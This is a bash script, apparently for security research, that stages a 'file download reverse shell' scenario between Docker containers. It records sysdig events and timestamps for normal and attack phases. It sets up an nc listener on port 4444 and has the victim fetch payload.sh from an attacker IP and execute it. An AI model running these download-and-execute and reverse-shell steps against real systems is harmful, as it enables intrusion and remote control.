#!/bin/bash

ATTACKER_IP="172.18.0.3"
OUTPUT_DIR="/home/marine/attack_data"

echo "==============================="
echo "시나리오 3: 파일 다운로드 리버스 쉘"
echo "==============================="

# 1단계: sysdig 수집 시작 (victim 컨테이너 필터 적용)
echo "[$(date +%T)] sysdig 수집 시작"
echo "COLLECTION_START: $(date +%s%N)" > $OUTPUT_DIR/timeline_scenario3.txt
sudo nohup sysdig -j "container.name=victim" >> $OUTPUT_DIR/scenario3_raw.json 2>/dev/null &
SYSDIG_PID=$!
sleep 2

# 2단계: 워크로드 시작 + 정상 구간 60초
echo "[$(date +%T)] victim 워크로드 시작"
docker exec -d victim bash /tmp/workload.sh
sleep 2

echo "[$(date +%T)] 정상 구간 시작 (60초)"
echo "NORMAL_START: $(date +%s%N)" >> $OUTPUT_DIR/timeline_scenario3.txt
sleep 60

# 3단계: attacker 준비
echo "[$(date +%T)] attacker HTTP 서버 시작"
docker exec -d attacker bash -c "cd /tmp && python3 -m http.server 8000"
sleep 2

echo "[$(date +%T)] attacker 리버스 쉘 대기"
docker exec -d attacker bash -c "nc -lvp 4444 > /tmp/shell_session.txt 2>&1"
sleep 2

# 4단계: 공격 시작
echo "[$(date +%T)] 공격 시작"
echo "ATTACK_START: $(date +%s%N)" >> $OUTPUT_DIR/timeline_scenario3.txt

docker exec victim bash -c "
  python3 -c \"import urllib.request; urllib.request.urlretrieve('http://${ATTACKER_IP}:8000/payload.sh', '/tmp/payload.sh')\"
  chmod +x /tmp/payload.sh
  bash /tmp/payload.sh &
"

# 5단계: 공격 구간 120초 유지
echo "[$(date +%T)] 공격 구간 유지 (120초)"
sleep 120

# 6단계: 수집 종료
echo "[$(date +%T)] 수집 종료"
echo "ATTACK_END: $(date +%s%N)" >> $OUTPUT_DIR/timeline_scenario3.txt

sudo kill $SYSDIG_PID 2>/dev/null
docker exec victim pkill -f workload.sh 2>/dev/null
docker exec attacker pkill python3 2>/dev/null
docker exec attacker pkill nc 2>/dev/null

echo "==============================="
echo "완료! 결과 확인:"
ls -lh $OUTPUT_DIR/scenario3_raw.json
echo "이벤트 수: $(wc -l < $OUTPUT_DIR/scenario3_raw.json)"
cat $OUTPUT_DIR/timeline_scenario3.txt
echo "==============================="
